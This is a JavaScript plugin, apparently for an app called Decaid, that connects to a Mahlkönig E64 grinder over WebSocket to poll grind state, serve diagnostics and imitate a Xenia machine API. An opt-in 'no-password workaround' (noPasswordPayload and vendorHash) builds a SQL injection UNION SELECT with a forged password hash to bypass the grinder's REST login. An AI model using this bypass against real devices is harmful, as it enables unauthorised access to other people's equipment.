function createPlugin(host) {
  "use strict";
  const MAX = 8, TIMEOUT = 5000, MAX_PENDING = 32, MINT_BACKOFF_MS = 5000, MINT_BACKOFF_MAX_MS = 300000;
  const idPattern = /^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/;
  const commands = {
    state: ["RequestDriverState", "RequestDriverStateResult"],
    config: ["RequestDriverConfig", "RequestDriverConfigResult"],
    machineInfo: ["RequestNachineInfo", "RequestNachineInfoResult"]
  };
  // Diagnostics keep only these vendor fields. Serial numbers, session ids,
  // Wi-Fi credentials, cloud URLs and log messages never leave the plugin.
  const exposed = {
    state: ["grindState", "state", "status", "mode", "grindFailure", "ddValueDum", "ddSensorFailed", "ddSensorAngle",
      "agsaStatus", "configId", "cpuTempDegC", "cpuTempFailed", "espAlive", "espVersionNo", "fan1Failed", "fan1TachoRpm",
      "fan2Failed", "fan2TachoRpm", "grindCurrentWeightGr", "grindFinalWeightGr", "grindResultWeightGr", "grindStartWeightGr",
      "grindTargetWeightGr", "grinderType", "hasNtc1", "motorRunTimeMs", "ntc1Failed", "ntc1TempDegC", "ntc2Failed",
      "ntc2TempDegC", "overheatNtc1", "overheatNtc2", "overshootWeightGr", "setupWizardState", "shiftCompensationFailed"],
    config: ["id", "configVersion", "grinderType", "grinderSubType", "grinderMotorType", "gbsAlgorithm", "grindTimeSec",
      "targetWeightGr", "buttonAction", "dddCalibrationAngleMilliDeg"],
    machineInfo: ["grinderType"]
  };
  function pick(data, keys) {
    const out = {};
    for (const key of keys) if (Object.prototype.hasOwnProperty.call(data, key)) out[key] = data[key];
    return out;
  }
  const instances = new Map();

  function fail(message) { throw new Error("E64 configuration error: " + message); }
  function jsonSetting(settings, key, fallback) {
    const value = settings && settings[key] !== undefined ? settings[key] : JSON.stringify(fallback);
    if (typeof value !== "string") fail(key + " must be JSON text");
    try { return JSON.parse(value); } catch (_) { fail(key + " is invalid JSON"); }
  }
  function validHost(value) {
    return typeof value === "string" && value.length > 0 && value.length <= 253 &&
      !/[\\/?#@\s]/.test(value) && (value[0] === "["
        ? value.endsWith("]") && value.length > 2
        : value.split(".").every((part) => /^[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?$/.test(part))) &&
      localHost(value.toLowerCase());
  }
  // Tokens and Owner passwords only go to loopback, RFC 1918, link-local,
  // IPv6 ULA/link-local or mDNS (.local) hosts.
  function localHost(value) {
    if (value[0] === "[") {
      const ip = value.slice(1, -1), first = ip.split(":")[0];
      return /^[0-9a-f:.]+$/.test(ip) && ip.indexOf(":") >= 0 &&
        (ip === "::1" || /^f[cd][0-9a-f]{2}$/.test(first) || /^fe[89ab][0-9a-f]$/.test(first));
    }
    const octets = value.split(".");
    if (octets.length === 4 && octets.every((part) => /^\d+$/.test(part))) {
      if (!octets.every((part) => /^(?:0|[1-9]\d{0,2})$/.test(part) && Number(part) <= 255)) return false;
      const a = Number(octets[0]), b = Number(octets[1]);
      return a === 10 || a === 127 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168) || (a === 169 && b === 254);
    }
    return value === "localhost" || value.endsWith(".local");
  }
  // Secure entries carry the host they were saved for, so editing the
  // ordinary InstancesJson host cannot redirect a stored secret.
  function boundSecret(map, key, id, field, host) {
    const entry = Object.prototype.hasOwnProperty.call(map, id) ? map[id] : undefined;
    if (entry === undefined || entry === "") return "";
    if (!entry || typeof entry !== "object" || Array.isArray(entry) || typeof entry.host !== "string" || typeof entry[field] !== "string") {
      fail(key + " entry for " + id + " must be an object with host and " + field);
    }
    if (entry.host.toLowerCase() !== host.toLowerCase()) fail(key + " entry for " + id + " was saved for another host; re-enter it for " + host);
    return entry[field];
  }
  function configuration(settings) {
    const rows = jsonSetting(settings, "InstancesJson", []);
    const tokens = jsonSetting(settings, "TokensJson", {});
    const passwords = jsonSetting(settings, "PasswordsJson", {});
    const mintTokens = jsonSetting(settings, "MintTokens", false);
    const allowNoPassword = jsonSetting(settings, "AllowNoPasswordWorkaround", false);
    if (!Array.isArray(rows) || rows.length > MAX || !tokens || Array.isArray(tokens) || typeof tokens !== "object") fail("invalid instance or token JSON");
    if (!passwords || Array.isArray(passwords) || typeof passwords !== "object") fail("PasswordsJson must be an object");
    if (typeof mintTokens !== "boolean") fail("MintTokens must be true or false");
    if (typeof allowNoPassword !== "boolean") fail("AllowNoPasswordWorkaround must be true or false");
    const ids = new Set();
    const result = rows.map((row) => {
      if (!row || typeof row !== "object" || Array.isArray(row)) fail("instances must be objects");
      const id = row.id, name = row.name, scheme = row.scheme === undefined ? "wss" : row.scheme;
      const pollMs = row.pollMs === undefined ? 1000 : row.pollMs;
      if (typeof id !== "string" || !idPattern.test(id) || ids.has(id)) fail("instance ids must be safe and unique");
      if (typeof name !== "string" || !name || name.length > 128) fail("instance name is invalid");
      if ((scheme !== "ws" && scheme !== "wss") || !Number.isInteger(row.port) || row.port < 1 || row.port > 65535) fail("instance address is invalid");
      if (!validHost(row.host)) fail("instance host must be a loopback, private, link-local or .local address");
      const certSha256 = row.certSha256 === undefined ? null : typeof row.certSha256 === "string" ? row.certSha256.replace(/:/g, "").toLowerCase() : "";
      if (certSha256 !== null && !/^[0-9a-f]{64}$/.test(certSha256)) fail("certSha256 must be 64 hex characters");
      const restPort = row.restPort === undefined ? 443 : row.restPort;
      if (!Number.isInteger(restPort) || restPort < 1 || restPort > 65535) fail("restPort is invalid");
      if (!Number.isInteger(pollMs) || pollMs < 0 || (pollMs !== 0 && pollMs < 100) || pollMs > 3600000) fail("pollMs is out of bounds");
      const token = boundSecret(tokens, "TokensJson", id, "token", row.host);
      const password = boundSecret(passwords, "PasswordsJson", id, "password", row.host);
      if (token.length > 2048) fail("TokensJson token is too long");
      if (password.length > 1024) fail("PasswordsJson password is too long");
      if (!mintTokens && !token) fail("each instance needs a token unless MintTokens is true");
      if (mintTokens && !token && !password && !allowNoPassword) fail("MintTokens needs a password or AllowNoPasswordWorkaround for " + id);
      ids.add(id);
      return {id, name, scheme, host: row.host, port: row.port, pollMs, token, certSha256, restPort,
        password, mintTokens, allowNoPassword, staticToken: Boolean(token)};
    });
    if (Object.keys(tokens).some((id) => !ids.has(id))) fail("TokensJson contains an unknown id");
    if (Object.keys(passwords).some((id) => !ids.has(id))) fail("PasswordsJson contains an unknown id");
    return result;
  }

  // --- Gated token minting helpers -------------------------------------
  // The vendor hash is only used by the explicit no-password workaround.
  // It is a SELECT-only login construction, not a database write.
  function sha256(bytes) {
    const K = [
      0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
      0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
      0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
      0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
      0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
      0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
      0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
      0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    ];
    const H = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19];
    const l = bytes.length;
    const padded = new Uint8Array((((l + 8) >> 6) + 1) << 6);
    padded.set(bytes);
    padded[l] = 0x80;
    const bits = l * 8;
    const dv = new DataView(padded.buffer);
    dv.setUint32(padded.length - 4, bits >>> 0);
    dv.setUint32(padded.length - 8, Math.floor(bits / 0x100000000));
    const w = new Uint32Array(64);
    for (let off = 0; off < padded.length; off += 64) {
      for (let i = 0; i < 16; i++) w[i] = dv.getUint32(off + i * 4);
      for (let i = 16; i < 64; i++) {
        const s0 = ((w[i - 15] >>> 7) | (w[i - 15] << 25)) ^ ((w[i - 15] >>> 18) | (w[i - 15] << 14)) ^ (w[i - 15] >>> 3);
        const s1 = ((w[i - 2] >>> 17) | (w[i - 2] << 15)) ^ ((w[i - 2] >>> 19) | (w[i - 2] << 13)) ^ (w[i - 2] >>> 10);
        w[i] = (w[i - 16] + s0 + w[i - 7] + s1) | 0;
      }
      let [a, b, c, d, e, f, g, h] = H;
      for (let i = 0; i < 64; i++) {
        const S1 = ((e >>> 6) | (e << 26)) ^ ((e >>> 11) | (e << 21)) ^ ((e >>> 25) | (e << 7));
        const ch = (e & f) ^ (~e & g);
        const t1 = (h + S1 + ch + K[i] + w[i]) | 0;
        const S0 = ((a >>> 2) | (a << 30)) ^ ((a >>> 13) | (a << 19)) ^ ((a >>> 22) | (a << 10));
        const maj = (a & b) ^ (a & c) ^ (b & c);
        const t2 = (S0 + maj) | 0;
        h = g; g = f; f = e; e = (d + t1) | 0; d = c; c = b; b = a; a = (t1 + t2) | 0;
      }
      H[0] = (H[0] + a) | 0; H[1] = (H[1] + b) | 0; H[2] = (H[2] + c) | 0; H[3] = (H[3] + d) | 0;
      H[4] = (H[4] + e) | 0; H[5] = (H[5] + f) | 0; H[6] = (H[6] + g) | 0; H[7] = (H[7] + h) | 0;
    }
    const out = new Uint8Array(32);
    const odv = new DataView(out.buffer);
    for (let i = 0; i < 8; i++) odv.setUint32(i * 4, H[i] >>> 0);
    return out;
  }
  function asciiBytes(value) {
    const out = [];
    for (let i = 0; i < value.length; i++) out.push(value.charCodeAt(i) & 255);
    return out;
  }
  function vendorHash(password, salt, rounds) {
    let value = asciiBytes(salt);
    const passwordBytes = asciiBytes(password), saltBytes = asciiBytes(salt);
    for (let i = 0; i < rounds; i++) {
      value = Array.from(sha256([...value, ...passwordBytes, ...saltBytes, ...value]));
    }
    let binary = "";
    for (const byte of value) binary += String.fromCharCode(byte);
    return btoa(binary).replace(/=+$/, "");
  }
  function randomHex(length) {
    let out = "";
    for (let i = 0; i < length; i++) out += Math.floor(Math.random() * 16).toString(16);
    return out;
  }
  function noPasswordPayload() {
    const password = randomHex(32), salt = randomHex(16), rounds = 1000;
    const encoded = "1$" + rounds + "$" + salt + "$" + vendorHash(password, salt, rounds);
    return {role: 'x" UNION SELECT "' + encoded + '" -- ', password};
  }
  function hostName(config) {
    return config.host.indexOf(":") >= 0 && config.host[0] !== "[" ? "[" + config.host + "]" : config.host;
  }

  function url(config) {
    return config.scheme + "://" + hostName(config) + ":" + config.port + "/?token=" + encodeURIComponent(config.token);
  }
  function stateOf(data) {
    if (data && data.grindFailure === true) return "error";
    const value = data && (Object.prototype.hasOwnProperty.call(data, "grindState") ? data.grindState : (data.state || data.status || data.mode));
    if (typeof value !== "string") return "unknown";
    const normalized = value.toLowerCase();
    // Firmware labels from the 2026-11-19 capture: Idle -> Grind -> GbwPostGrind -> Idle.
    if (["grinding", "running", "active", "grind", "manualstartgrind", "gbtstartgrind"].includes(normalized)) return "grinding";
    if (["idle", "ready", "stopped"].includes(normalized)) return "idle";
    if (["error", "fault"].includes(normalized)) return "error";
    return "unknown";
  }

  // --- Xenia-compatible surface ----------------------------------------
  // The E64 polls http://<host>/api/v2/* on port 80. A Decaid plugin cannot
  // bind that port, so tools/xenia_bridge.py proxies those paths to these
  // endpoints. State is derived from Decaid's machine stateUpdate events.
  const xenia = {
    maStatus: 1, extractionStatus: 0, flow: 0, volumeMl: 0,
    setTemp: 0, sensTemp: 0, tankLevel: 1,
    extractionStart: null, extractionDurationMs: 0, lastUpdate: null
  };
  function round(value, digits) {
    const factor = Math.pow(10, digits);
    return Math.round((Number(value) || 0) * factor) / factor;
  }
  function xeniaTimestamp() {
    const d = new Date();
    const pad = (n) => String(n).padStart(2, "0");
    return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) +
      " " + pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
  }
  function updateXenia(payload) {
    if (!payload || typeof payload !== "object") return;
    const state = payload.state && typeof payload.state.state === "string" ? payload.state.state : "";
    const substate = payload.state && typeof payload.state.substate === "string" ? payload.state.substate : "";
    const now = Date.now();
    const dt = xenia.lastUpdate === null ? 0 : Math.max(0, (now - xenia.lastUpdate) / 1000);
    xenia.lastUpdate = now;
    xenia.flow = Number(payload.flow) || 0;
    xenia.setTemp = Number(payload.targetGroupTemperature) || 0;
    xenia.sensTemp = Number(payload.groupTemperature) || 0;
    xenia.tankLevel = state === "needsWater" ? 0 : 1;
    const serving = state === "espresso" &&
      (substate === "preparingForShot" || substate === "preinfusion" || substate === "pouring");
    if (serving) {
      if (xenia.maStatus !== 3) {
        xenia.maStatus = 3;
        xenia.extractionStatus = 1;
        xenia.extractionStart = now;
        xenia.extractionDurationMs = 0;
        xenia.volumeMl = 0;
      } else {
        xenia.volumeMl += Math.max(0, xenia.flow) * dt;
      }
      return;
    }
    if (state === "espresso" && substate === "pouringDone") {
      if (xenia.maStatus !== 4) {
        xenia.maStatus = 4;
        xenia.extractionStatus = 0;
        xenia.extractionDurationMs = xenia.extractionStart === null
          ? 0 : Math.max(0, now - xenia.extractionStart);
      }
      return;
    }
    xenia.maStatus = 1;
    xenia.extractionStatus = 0;
    xenia.extractionStart = null;
    // Keep the last duration/volume until the next serving start so a poll
    // after finishing still sees the completed shot.
  }
  function xeniaMako() {
    const liveMs = xenia.maStatus === 3 && xenia.extractionStart !== null
      ? Math.max(0, Date.now() - xenia.extractionStart) : xenia.extractionDurationMs;
    return {
      MA_STATUS: xenia.maStatus,
      PU_SENS_FLOW_METER_VOLUME: round(xenia.volumeMl, 2),
      PU_SENS_FLOW_METER_FLOWRATE: round(xenia.flow, 2),
      MA_EXTRACTION_STATUS: xenia.extractionStatus,
      BG_SET_TEMP: round(xenia.setTemp, 1),
      BG_SENS_TEMP: round(xenia.sensTemp, 1),
      REAL_EXTRACTION_TIME_MS: Math.max(0, Math.round(liveMs)),
      TANK_LEVEL: xenia.tankLevel,
      TIMESTAMP: xeniaTimestamp(),
      script: "Decaid"
    };
  }
  function xeniaMachine() {
    return {
      MA_TYPE: "Xenia", MA_SN: "DECAID-XENIA",
      FW_VERSION_MAJOR: 1, FW_VERSION_MINOR: 0,
      ESP_FW_MAJOR: 0, ESP_FW_MINOR: 0
    };
  }
  function xeniaRead(instance) {
    const sync = instance.xenia;
    return {
      mako: xeniaMako(), machine: xeniaMachine(),
      sync: {SYNC_BEVERAGE_WEIGHT: sync.syncWeight, SYNC_FILTER: sync.syncFilter},
      lastScriptId: sync.lastScriptId, lastScriptAt: sync.lastScriptAt,
      brewStartAutomated: false
    };
  }

  function make(config) {
    return {config, deviceId: null, context: null, transport: null, handle: null, epoch: 0, nextId: 0, pending: new Map(), poll: null, observationExpiry: null, connected: false, observations: {}, lastObservationAt: null, tokenSource: config.staticToken ? "static" : "none", lastMintAt: null, lastMintError: null, mintFailures: 0, nextMintAt: null,
      xenia: {syncWeight: 0, syncFilter: 0, lastScriptId: null, lastScriptAt: null}};
  }
  function clear(instance) { if (instance.poll !== null) clearTimeout(instance.poll); instance.poll = null; clearTimeout(instance.observationExpiry); instance.observationExpiry = null; }
  function rejectAll(instance, reason) { for (const item of instance.pending.values()) { clearTimeout(item.timer); item.reject(new Error(reason)); } instance.pending.clear(); }
  function schedule(instance, epoch) {
    if (!instance.connected || instance.config.pollMs === 0 || instance.epoch !== epoch) return;
    instance.poll = setTimeout(() => {
      instance.poll = null;
      request(instance, "state", true).catch((error) => {
        if (instance.epoch !== epoch || !instance.connected) return;
        const context = instance.context;
        disconnect(instance, epoch, error.message).finally(() => context && context.reportDisconnected().catch(() => {}));
      }).then(() => { if (instance.epoch === epoch) schedule(instance, epoch); });
    }, instance.config.pollMs);
  }
  function response(instance, epoch, message) {
    if (epoch !== instance.epoch || !message || !Number.isInteger(message.refId)) return;
    const item = instance.pending.get(message.refId);
    if (!item || item.epoch !== epoch) return;
    instance.pending.delete(message.refId); clearTimeout(item.timer);
    if (message.type !== item.type || !Object.prototype.hasOwnProperty.call(message, "data")) { item.reject(new Error("E64 invalid response")); return; }
    if (item.publish) {
      if (!message.data || typeof message.data !== "object" || Array.isArray(message.data)) { item.reject(new Error("E64 invalid state response")); return; }
      const observed = pick(message.data, exposed.state);
      instance.observations.state = observed;
      instance.lastObservationAt = new Date().toISOString();
      clearTimeout(instance.observationExpiry); instance.observationExpiry = null;
      const snapshot = {state: stateOf(message.data)};
      if (message.data.ddSensorFailed === false && Number.isSafeInteger(message.data.ddValueDum) && message.data.ddValueDum >= 0) {
        // The grinder's own display value in micrometres: HMI AbstractAgsaDdSensor::ddValueUm()
        // computes (dd + 5) / 10 with integer division, so 827 shows as 83.
        snapshot.observedSetting = String(Math.floor((message.data.ddValueDum + 5) / 10));
        instance.observationExpiry = setTimeout(() => {
          if (instance.epoch !== epoch || !instance.connected || instance.observations.state !== observed) return;
          instance.observationExpiry = null;
          instance.context.publish({state: snapshot.state}).catch(() => failSession(instance, epoch, "E64 observation expired"));
        }, TIMEOUT);
      }
      instance.context.publish(snapshot).then(item.resolve, item.reject);
    } else {
      if (!message.data || typeof message.data !== "object" || Array.isArray(message.data)) { item.reject(new Error("E64 invalid read response")); return; }
      const observed = pick(message.data, exposed[item.name]);
      instance.observations[item.name] = observed; instance.lastObservationAt = new Date().toISOString(); item.resolve(observed);
    }
  }
  function event(instance, epoch, handle, event) {
    if (epoch !== instance.epoch || handle !== instance.handle) return;
    if (event.type === "error" || event.type === "close") {
      const context = instance.context;
      return disconnect(instance, epoch, "E64 connection closed").finally(() => context && context.reportDisconnected().catch(() => {}));
    }
    if (event.type !== "data" || event.dataType !== "text") return;
    let message;
    try { message = JSON.parse(event.data); } catch (_) { return failSession(instance, epoch, "E64 invalid response"); }
    if (message && message.pong === true) return;
    response(instance, epoch, message);
  }
  function failSession(instance, epoch, reason) {
    if (epoch !== instance.epoch) return Promise.resolve();
    const context = instance.context;
    return disconnect(instance, epoch, reason).finally(() => context && context.reportDisconnected().catch(() => {}));
  }
  async function mintToken(instance) {
    const config = instance.config;
    if (instance.nextMintAt !== null && Date.now() < instance.nextMintAt) throw new Error("login backoff");
    let role = "Owner", password = config.password;
    if (!password) {
      if (!config.allowNoPassword) throw new Error("no token, password or workaround configured");
      const payload = noPasswordPayload();
      role = payload.role; password = payload.password;
    }
    // The E64 REST API is HTTPS-only (443; HTTP 80 redirects), whatever the WebSocket scheme.
    let failure = "login request failed";
    try {
      const response = await fetch("https://" + hostName(config) + (config.restPort === 443 ? "" : ":" + config.restPort) + "/rest_api/login", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({userRole: role, password}),
        ...(config.certSha256 ? {tlsPinSha256: config.certSha256} : {})
      });
      // Device response text is never echoed: only a fixed category and the status.
      if (!response || !response.ok) failure = "login HTTP " + (response && Number.isInteger(response.status) ? response.status : "unknown");
      else {
        const auth = response.headers && response.headers.get ? response.headers.get("authorization") : "";
        if (auth && auth.startsWith("Bearer ") && auth.slice(7).trim()) {
          instance.tokenSource = config.password ? "password" : "workaround";
          instance.lastMintAt = new Date().toISOString();
          instance.lastMintError = null; instance.mintFailures = 0; instance.nextMintAt = null;
          loginNotice(instance, null);
          return auth.slice(7).trim();
        }
        failure = "login returned no bearer token";
      }
    } catch (_) {}
    instance.tokenSource = "none";
    instance.lastMintError = failure;
    instance.mintFailures++;
    instance.nextMintAt = Date.now() + Math.min(MINT_BACKOFF_MS * Math.pow(2, instance.mintFailures - 1), MINT_BACKOFF_MAX_MS);
    loginNotice(instance, failure);
    throw new Error(failure);
  }
  // A failing login is a current condition the user must fix; withdraw it once a login succeeds.
  function loginNotice(instance, failure) {
    const id = "login-" + instance.config.id;
    try {
      if (failure === null) host.dismissNotification(id);
      else host.notify({id, message: "E64 " + instance.config.name + ": " + failure + ". Check the Owner password, certSha256 and grinder address.",
        action: {id: "help", label: "Help", type: "openExternalUrl", url: "https://github.com/MaxRink/decaid-e64ws-plugin#token-acquisition"}});
    } catch (_) {}
  }
  function disconnect(instance, expectedEpoch, reason) {
    if (expectedEpoch !== undefined && expectedEpoch !== instance.epoch) return Promise.resolve();
    const transport = instance.transport, handle = instance.handle;
    instance.epoch++; instance.connected = false; instance.transport = null; instance.handle = null; instance.context = null; clear(instance); rejectAll(instance, reason || "E64 disconnected");
    if (instance.config && instance.config.mintTokens && !instance.config.staticToken) { instance.config.token = ""; instance.tokenSource = "none"; }
    return transport && handle ? transport.close(handle).catch(() => {}) : Promise.resolve();
  }
  async function connect(instance, context) {
    await disconnect(instance);
    const epoch = ++instance.epoch; const transport = context.transport;
    instance.context = context; instance.transport = transport; instance.observations = {}; instance.lastObservationAt = null;
    try {
      if (!instance.config.token && instance.config.mintTokens) {
        const token = await mintToken(instance);
        if (epoch !== instance.epoch) return;
        instance.config.token = token;
      }
      const pin = instance.config.scheme === "wss" && instance.config.certSha256 ? {tlsPinSha256: instance.config.certSha256} : {};
      const opened = await transport.open({kind: "websocket", url: url(instance.config), ...pin});
      if (epoch !== instance.epoch) { await transport.close(opened.handle).catch(() => {}); return; }
      instance.handle = opened.handle; instance.connected = true;
      transport.onEvent(opened.handle, (eventValue) => event(instance, epoch, opened.handle, eventValue));
      await request(instance, "state", true); schedule(instance, epoch);
    } catch (error) {
      await disconnect(instance, epoch, "E64 connection failed");
      // Host WebSocket errors can echo the connect URL, which carries the token.
      const detail = error && error.message ? ": " + String(error.message).replace(/token=[^&#'"\s]*/g, "token=[redacted]") : "";
      throw new Error("E64 connection failed" + detail);
    }
  }
  function request(instance, name, publish) {
    if (!instance.connected || !instance.transport || !instance.handle) return Promise.reject(new Error("E64 is disconnected"));
    // Diagnostics reads must not starve the single in-flight state poll.
    if (!publish && instance.pending.size >= MAX_PENDING) return Promise.reject(new Error("E64 request queue is full"));
    const epoch = instance.epoch, id = ++instance.nextId, command = commands[name];
    return new Promise((resolve, reject) => {
      const item = {epoch, type: command[1], name, publish, resolve, reject, timer: setTimeout(() => { if (instance.pending.delete(id)) reject(new Error("E64 request timed out")); }, TIMEOUT)};
      instance.pending.set(id, item);
      instance.transport.send(instance.handle, {type: "text", data: JSON.stringify({type: command[0], msgId: id, data: {}})}).catch(() => { if (instance.pending.delete(id)) { clearTimeout(item.timer); reject(new Error("E64 request failed")); } });
    });
  }
  const plugin = {
    id: "mahlkoenig-e64.reaplugin",
    onLoad(settings) {
      const configs = configuration(settings);
      return Promise.all(configs.map((config) => {
        const instance = make(config); instances.set(config.id, instance);
        return host.devices.register({driverId: "e64", instanceId: config.id, name: config.name}, {connect: (context) => connect(instance, context), disconnect: () => disconnect(instance)})
          .then((device) => { instance.deviceId = device.deviceId; return device; },
            // A failed registration drops only that instance; the others stay usable.
            () => { instances.delete(config.id); return null; });
      }));
    },
    onUnload() { return Promise.all(Array.from(instances.values()).map((instance) => disconnect(instance))); },
    onEvent(event) { if (event && event.name === "stateUpdate" && event.payload) updateXenia(event.payload); },
    handleHttpRequest(request) {
      const jsonResponse = (status, payload) => ({status, headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload)});
      if (request.endpoint === "xenia-mako" || request.endpoint === "xenia-machine" ||
          request.endpoint === "xenia-brewratio" || request.endpoint === "xenia-scripts-execute") {
        if (request.endpoint === "xenia-mako") {
          return request.method === "GET" ? jsonResponse(200, xeniaMako()) : jsonResponse(405, {error: "method not allowed"});
        }
        if (request.endpoint === "xenia-machine") {
          return request.method === "GET" ? jsonResponse(200, xeniaMachine()) : jsonResponse(405, {error: "method not allowed"});
        }
        if (request.method !== "POST") return jsonResponse(405, {error: "method not allowed"});
        // The bridge adds ?instance=<id>; with a single instance it may be omitted.
        const wanted = request.query && request.query.instance;
        const target = wanted === undefined ? (instances.size === 1 ? Array.from(instances.values())[0] : null) : instances.get(wanted);
        if (!target) return jsonResponse(wanted === undefined ? 400 : 404, {error: wanted === undefined ? "instance query required" : "unknown instance"});
        const sync = target.xenia;
        const body = request.body;
        if (!body || typeof body !== "object" || Array.isArray(body)) return jsonResponse(400, {error: "invalid body"});
        if (request.endpoint === "xenia-brewratio") {
          const numeric = (value) => typeof value === "number" || (typeof value === "string" && value.trim() !== "") ? Number(value) : NaN;
          const weight = numeric(body.SYNC_BEVERAGE_WEIGHT);
          const filter = numeric(body.SYNC_FILTER);
          if (!Number.isFinite(weight) || !Number.isInteger(filter)) return jsonResponse(400, {error: "invalid brew ratio"});
          sync.syncWeight = Math.round(weight);
          sync.syncFilter = filter;
          return jsonResponse(200, {MA_SYNC_BEVERAGE_WEIGHT: sync.syncWeight, MA_SYNC_FILTER: sync.syncFilter});
        }
        if (!Number.isInteger(body.ID)) return jsonResponse(400, {error: "invalid script ID"});
        sync.lastScriptId = body.ID;
        sync.lastScriptAt = new Date().toISOString();
        return jsonResponse(200, {ok: true, ID: body.ID, started: false});
      }
      if (request.endpoint !== "e64-diagnostics") return jsonResponse(404, {error: "unknown endpoint"});
      if (request.method !== "GET") return jsonResponse(405, {error: "method not allowed"});
      const id = request.query && request.query.deviceId;
      const instance = Array.from(instances.values()).find((candidate) => candidate.deviceId === id);
      if (!instance) return {status: 404, headers: {"Content-Type": "application/json"}, body: JSON.stringify({error: "unknown instance"})};
      const read = request.query.read;
      if (read !== undefined && read !== "config" && read !== "machineInfo" && read !== "connection" && read !== "xenia") return jsonResponse(400, {error: "unsupported read"});
      const operation = read === undefined ? null : read;
      if (operation === "xenia") return Promise.resolve(jsonResponse(200, xeniaRead(instance)));
      if (operation === "connection") {
        const connection = {connected: instance.connected, tokenSource: instance.tokenSource,
          lastMintAt: instance.lastMintAt, lastMintError: instance.lastMintError,
          mintBackoffUntil: instance.nextMintAt === null ? null : new Date(instance.nextMintAt).toISOString(),
          staticToken: Boolean(instance.config.staticToken), mintTokens: Boolean(instance.config.mintTokens)};
        return Promise.resolve({status: 200, headers: {"Content-Type": "application/json"}, body: JSON.stringify(connection)});
      }
      const headers = (live) => ({"Content-Type": "application/json", "X-E64-Observation-State": live ? "live" : (instance.lastObservationAt ? "last-known" : "none"), ...(instance.lastObservationAt ? {"X-E64-Observation-Time": instance.lastObservationAt} : {})});
      return (operation ? requestRead(instance, operation) : Promise.resolve(instance.observations)).then((data) => ({status: 200, headers: headers(Boolean(operation)), body: JSON.stringify(data)}), () => ({status: 503, headers: headers(false), body: JSON.stringify({error: "E64 unavailable"})}));
    }
  };
  function requestRead(instance, operation) { return request(instance, operation, false); }
  return plugin;
}
